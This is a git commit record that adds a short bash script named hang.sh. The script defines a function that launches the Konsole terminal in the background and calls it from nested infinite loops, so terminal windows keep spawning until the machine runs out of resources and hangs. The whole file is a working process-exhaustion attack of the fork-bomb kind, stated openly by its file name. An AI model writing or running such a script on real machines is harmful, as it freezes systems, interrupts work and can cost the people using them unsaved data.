75e9263d45736fccff521fe91cf59bf38067f587
radix <xidar007@gmail.com>
2020-07-14 22:03:24 +0530

    First Commit

---
+++ hang.sh
@@ -0,0 +1,27 @@
+#!/usr/bin/env bash
+# File : hang.sh
+
+function ac { 
+konsole&
+}
+
+while true 
+do
+	while true
+	do
+		ac
+		while true 
+		do
+			ac
+			while true
+			do
+				ac
+			done
+		done
+	done
+done
+
+
+
+
+
